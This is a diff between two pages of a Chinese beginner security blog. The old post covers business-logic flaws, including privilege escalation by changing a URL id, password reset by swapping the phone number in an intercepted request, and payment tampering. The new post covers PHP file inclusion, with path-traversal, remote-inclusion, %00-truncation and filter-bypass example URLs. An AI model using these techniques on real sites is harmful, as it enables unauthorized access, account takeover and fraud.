@@ -15,20 +15,17 @@
 
 
 
-<meta name="description" content="逻辑漏洞：由于程序逻辑不严或逻辑太复杂，导致一些逻辑分支不能够正常处理或处理错误.(程序不能处理一些逻辑上的漏洞，但并不代表程序会出错。)">
-<meta name="keywords">
+<meta name="description" content="文件包含漏洞：服务器通过php的特性（函数）去包含任意文件时，由于要包含的这个文件来源过滤不严，从而可以去包含一个恶意文件，而我们可以构造这个恶意文件来达到邪恶的目的。（其实不止PHP，ASP、JSP,、ASP.Net都存在文件包含漏洞）">
+<meta name="keywords" content="Web安全">
 <meta property="og:type" content="article">
-<meta property="og:title" content="逻辑错误漏洞">
-<meta property="og:url" content="http://yoursite.com/2017/04/10/逻辑错误漏洞/index.html">
+<meta property="og:title" content="文件包含漏洞">
+<meta property="og:url" content="http://yoursite.com/2017/04/15/文件包含漏洞/index.html">
 <meta property="og:site_name" content="大佬要我改个名">
-<meta property="og:description" content="逻辑漏洞：由于程序逻辑不严或逻辑太复杂，导致一些逻辑分支不能够正常处理或处理错误.(程序不能处理一些逻辑上的漏洞，但并不代表程序会出错。)">
-<meta property="og:image" content="http://i.imgur.com/oJ1XwAo.png">
-<meta property="og:image" content="http://i.imgur.com/sLlMFno.png">
-<meta property="og:updated_time" content="2017-04-14T16:10:04.527Z">
+<meta property="og:description" content="文件包含漏洞：服务器通过php的特性（函数）去包含任意文件时，由于要包含的这个文件来源过滤不严，从而可以去包含一个恶意文件，而我们可以构造这个恶意文件来达到邪恶的目的。（其实不止PHP，ASP、JSP,、ASP.Net都存在文件包含漏洞）">
+<meta property="og:updated_time" content="2017-04-15T03:42:45.662Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="逻辑错误漏洞">
-<meta name="twitter:description" content="逻辑漏洞：由于程序逻辑不严或逻辑太复杂，导致一些逻辑分支不能够正常处理或处理错误.(程序不能处理一些逻辑上的漏洞，但并不代表程序会出错。)">
-<meta name="twitter:image" content="http://i.imgur.com/oJ1XwAo.png">
+<meta name="twitter:title" content="文件包含漏洞">
+<meta name="twitter:description" content="文件包含漏洞：服务器通过php的特性（函数）去包含任意文件时，由于要包含的这个文件来源过滤不严，从而可以去包含一个恶意文件，而我们可以构造这个恶意文件来达到邪恶的目的。（其实不止PHP，ASP、JSP,、ASP.Net都存在文件包含漏洞）">
 
 <link rel="apple-touch-icon" href= "/apple-touch-icon.png">
 
@@ -60,7 +57,7 @@
 <link href="//cdn.bootcss.com/font-awesome/4.6.3/css/font-awesome.min.css" rel="stylesheet">
 
 
-<title>逻辑错误漏洞 | 大佬要我改个名</title>
+<title>文件包含漏洞 | 大佬要我改个名</title>
 
 <script src="//cdn.bootcss.com/jquery/2.2.4/jquery.min.js"></script>
 <script src="//cdn.bootcss.com/clipboard.js/1.5.10/clipboard.min.js"></script>
@@ -271,11 +268,11 @@
     </div>
     <link class="menu-list" tags="标签" friends="友情链接" about="关于我"/>
 </nav>
-      <div class="body-wrap"><article id="post-逻辑错误漏洞" class="article article-type-post" itemscope itemprop="blogPost">
+      <div class="body-wrap"><article id="post-文件包含漏洞" class="article article-type-post" itemscope itemprop="blogPost">
   
     <div class="article-meta">
-      <a href="/2017/04/10/逻辑错误漏洞/" class="article-date">
-      <time datetime="2017-04-10T08:57:07.994Z" itemprop="datePublished">2017-04-10</time>
+      <a href="/2017/04/15/文件包含漏洞/" class="article-date">
+      <time datetime="2017-04-15T03:51:16.310Z" itemprop="datePublished">2017-04-15</time>
 </a>
 
 
@@ -290,7 +287,7 @@
         
   
     <h1 class="article-title" itemprop="name">
-      逻辑错误漏洞
+      文件包含漏洞
     </h1>
   
 
@@ -300,6 +297,10 @@
         
 
         
+    <div class="article-tag tagcloud">
+        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Web安全/">Web安全</a></li></ul>
+    </div>
+
         <div class="clearfix"></div>
       </div>
       
@@ -307,32 +308,25 @@
     <div class="article-entry" itemprop="articleBody">
       
           
-        <p>逻辑漏洞：由于程序逻辑不严或逻辑太复杂，导致一些逻辑分支不能够正常处理或处理错误.(程序不能处理一些逻辑上的漏洞，但并不代表程序会出错。)<br><a id="more"></a><br>例如：这件在本地验证时值10元，传到服务端也是10元，那么问题来了，假如一件10元的物品被修改成1元传到服务器，服务端没有验证，是不是也是用1元来解析物品价格呢，逻辑漏洞就是这种。</p>
-<p>出现地方：业务流程上。所以一般工具都无法识别。<br>   例如：修改密码，找回密码，修改个人资料，物品购买时资金提交等。</p>
-<p>绕过授权验证：<br>   水平越权：相同级别用户之间的信息访问或修改<br>   垂直越权：不同级别直接的用户的信息访问或修改（例如：用户和管理员）</p>
-<p>  例子：<br>当访问我的个人信息时（假设我的账号为123456），<br>URL为：www.qwerdf.com/user/Information?id=123456.php<br>但当我把<br>URL改为：www.qwerdf.com/user/Information?id=456.php<br>也访问了账号456的人的信息，<br>就称为水平越权。</p>
-<p>当我把user改成admin,（假设某一位管理员ID=1）<br>URL为：www.qwerdf.com/admin/Information?id=1.php时<br>我也访问了管理员信息<br>就称为垂直越权</p>
-<p>当然，除了查看信息，删除，修改，增加等非正常操作都是越权。</p>
+        <p>文件包含漏洞：服务器通过php的特性（函数）去包含任意文件时，由于要包含的这个文件来源过滤不严，从而可以去包含一个恶意文件，而我们可以构造这个恶意文件来达到邪恶的目的。（其实不止PHP，ASP、JSP,、ASP.Net都存在文件包含漏洞）<br><a id="more"></a><br>因为程序人员通常把重复使用的函数写到单个文件，在使用时就直接调用此文件，调用文件的过程就是文件包含。也因为PHP语言提供的文件包含太灵活和强大，所以漏洞或许多些。</p>
 <hr>
-<p>密码找回逻辑漏洞：<br>假设：www.xxoo.com/mima/back.asp 为一个密码找回页面<br><img src="http://i.imgur.com/oJ1XwAo.png" alt=""><br>当我填写找回密码的账号时，跳到身份验证这一步，获取验证码，填写正确后，就会跳到设置新密码那一步，然后完成。</p>
-<p>但是如果身份验证那一步没设置好，就会出现密码找回的逻辑漏洞。</p>
-<p>假设我在身份验证的时候抓包，发现包里有个验证手机号码为：186<strong><em>**</em></strong>。<br>然后我把包里的号码修改为其它手机号，发现其它手机号接收到了验证码，<br>我就可以凭借这验证码修改密码了。</p>
-<p>这就是逻辑漏洞。</p>
-<p>利用过程：<br>1.输入其它账号，<br>2.到身份验证时修改原本的验证号码的信息。<br>3.得到返回的验证码后<br>4.加以利用就可以做出修改了。</p>
+<p>PHP中有四个包含函数：incluede（）、include_once（）、require（）、require_once（）。</p>
+<p>Include（）：函数包含文件时，只有代码执行到include()函数时将文件包含进来。发生错误时系统只给出一个警告，继续向下执行。</p>
+<p>include_once（）：函数基本和include()相同，不过差别是：重复调用同一文件时，程序只调用一次。建议尽量使用include_once()函数不会因为重复包含文件而发生错误。</p>
+<p>Require（）函数与include（）的差别是：<br>1，    如果发生错误，函数会输出错误信息，并立即终止脚本的处理。<br>2，    函数调用文件时，只要程序一执行，立即调用文件，而include()只有程序执行到该函数时，才调用。</p>
+<p>require_once（）：此行语句和require（）语句类似，唯一区别就是如果该文件中的代码已经被包含，则不会再次包含。</p>
 <hr>
-<p>支付逻辑漏洞：<br>原理同上。。<br>都是在发送服务器端支付信息时修改里面的内容即可。</p>
-<p>利用地方：<br>1.商品数量<br>2.商品价格<br>3.商品折扣<br>4.商品运费<br>5.商品信息的中转、跳转、到支付接口时的参数。 </p>
-<p>（当类型判断不正确时，例如加入数量应该为整型，但是强行修改为字符型或其它不相关的类型时，有可能会导致系统崩毁或报错）</p>
+<p>文件包含分类：远程包含（LFI）、本地包含（RFI）。<br>     区别：被包含的文件在服务器本地时，就形成的本地文件包含漏洞，被包涵的文件在第三方服务是，就形成了远程文件包含漏洞。</p>
+<p>漏洞成因：在通过引入文件时，引用的文件名，用户可控，由于传入的文件名没有经过合理的校验，或者校验被绕过，从而操作了预想之外的文件，就 可能导致意外的文件泄露甚至恶意的代码注入。</p>
 <hr>
-<p>账户的恶意攻击：<br>   假入A账户要冻结B账户的银行卡。操作如下：</p>
+<p>用法：正常URL：www.xxoo.com/action/n=file.php<br>      假如根目录存在文件包含漏洞：<br>www.xxoo.com/action/n=../../../../robots.txt（多../几个可以确保回到根目录）<br>则把robots.txt文件读取出来，<br>假如robots.txt符合PHP代码类型，则按照php代码类型去执行robots文件<br>（其实无论哪个文件后缀，只要符合PHP类型，则按PHP解析文件。不然则以文本格式显示文件内容）</p>
+<hr>
+<p>远程包含：www.xxoo.com/action/n=<a href="http://www.bbb.com/2/n=robots.txt" target="_blank" rel="external">http://www.bbb.com/2/n=robots.txt</a><br>        则输入 <a href="http://www.bbb.com网站的robots.txt文件" target="_blank" rel="external">http://www.bbb.com网站的robots.txt文件</a><br>  前提：都有包含漏洞。都开启了allow_url_include=on</p>
+<hr>
+<p>注：1.其实有些版本还支持%00截断，例如www.xxoo.com/action/n=file.php%00.jpg。但是解析是以php解析（绕过后缀必须为指定后缀）。</p>
 <ol>
-<li>A账户输入B账户的银行卡信息，然后故意输错密码</li>
-<li>当系统的安全机制（防爆破）提示还可输错4次时</li>
-<li>A再进行输错的操作</li>
-<li>B账户冻结</li>
-<li>账户的恶意攻击成功实施。</li>
+<li>str_replace（）：将”http:// ”、”<a href="https://”、" target="_blank" rel="external">https://”、</a> ” ../”、”..\”替换为空字符<br>绕过：双写绕过替换规则如page=ht<a href="http://tp://192.168.1.1/robots.txt" target="_blank" rel="external">http://tp://192.168.1.1/robots.txt</a> (应用于远程包含)<br>3.当运用个别包含函数时，输入错误文件可爆出绝对路径</li>
 </ol>
-<p><img src="http://i.imgur.com/sLlMFno.png" alt=""></p>
 
       
     </div>
@@ -341,13 +335,13 @@
   
     
     <div class="copyright">
-        <p><span>本文标题:</span><a href="/2017/04/10/逻辑错误漏洞/">逻辑错误漏洞</a></p>
+        <p><span>本文标题:</span><a href="/2017/04/15/文件包含漏洞/">文件包含漏洞</a></p>
         <p><span>文章作者:</span><a href="/" title="回到主页">Mark</a></p>
-        <p><span>发布时间:</span>2017-04-10, 16:57:07</p>
-        <p><span>最后更新:</span>2017-04-15, 00:10:04</p>
+        <p><span>发布时间:</span>2017-04-15, 11:51:16</p>
+        <p><span>最后更新:</span>2017-04-15, 11:42:45</p>
         <p>
-            <span>原始链接:</span><a class="post-url" href="/2017/04/10/逻辑错误漏洞/" title="逻辑错误漏洞">http://yoursite.com/2017/04/10/逻辑错误漏洞/</a>
-            <span class="copy-path" data-clipboard-text="原文: http://yoursite.com/2017/04/10/逻辑错误漏洞/　　作者: Mark" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
+            <span>原始链接:</span><a class="post-url" href="/2017/04/15/文件包含漏洞/" title="文件包含漏洞">http://yoursite.com/2017/04/15/文件包含漏洞/</a>
+            <span class="copy-path" data-clipboard-text="原文: http://yoursite.com/2017/04/15/文件包含漏洞/　　作者: Mark" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
             <script> var clipboard = new Clipboard('.copy-path'); </script>
         </p>
         <p>
@@ -360,17 +354,11 @@
     <nav id="article-nav">
         
             <div id="article-nav-newer" class="article-nav-title">
-                <a href="/2017/04/10/CSRF/">
-                    CSRF
+                <a href="/2017/04/15/社会工程学/">
+                    社会工程学
                 </a>
             </div>
         
-        
-            <div id="article-nav-older" class="article-nav-title">
-                <a href="/2017/04/10/上传篇/">
-                    上传篇
-                </a>
-            </div>
         
     </nav>
 
@@ -416,7 +404,7 @@
         </div>
         <script>
             window._bd_share_config={
-                "common":{"bdSnsKey":{},"bdText":"逻辑错误漏洞　| 大佬要我改个名　","bdMini":"2","bdMiniList":false,"bdPic":"","bdStyle":"0","bdSize":"24"},"share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='http://bdimg.share.baidu.com/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];
+                "common":{"bdSnsKey":{},"bdText":"文件包含漏洞　| 大佬要我改个名　","bdMini":"2","bdMiniList":false,"bdPic":"","bdStyle":"0","bdSize":"24"},"share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='http://bdimg.share.baidu.com/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];
         </script>
     
 
@@ -436,7 +424,7 @@
 
     <div class="scroll" id="post-nav-button">
         
-            <a href="/2017/04/10/CSRF/" title="上一篇: CSRF">
+            <a href="/2017/04/15/社会工程学/" title="上一篇: 社会工程学">
                 <i class="fa fa-angle-left"></i>
             </a>
         
@@ -444,9 +432,7 @@
         <a title="文章列表"><i class="fa fa-bars"></i><i class="fa fa-times"></i></a>
 
         
-            <a href="/2017/04/10/上传篇/" title="下一篇: 上传篇">
-                <i class="fa fa-angle-right"></i>
-            </a>
+            <a href="/" title="回到主页"><i class="fa fa-home"></i></a>
         
     </div>
 
